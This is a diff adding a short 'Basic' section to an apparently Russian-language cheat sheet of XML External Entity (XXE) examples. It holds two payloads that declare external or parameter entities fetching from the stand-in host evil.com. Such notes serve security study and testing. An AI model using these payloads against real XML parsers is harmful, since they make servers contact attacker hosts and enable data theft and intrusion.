@@ -1,5 +1,25 @@
 # Examples XXE
 
+## Basic
+
+1 Можем использовать объявленную сущность в теле XML
+
+```markup
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/xxe"> ]>
+<root>
+    <data>&xxe;</data>
+</root>
+```
+
+2 Можем использовать объявленную сущность как определение следующей сущности в Doctype.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/xxe"> &xxe; ]>
+<root></root>
+```
+
 ## Include local file
 
 ```markup
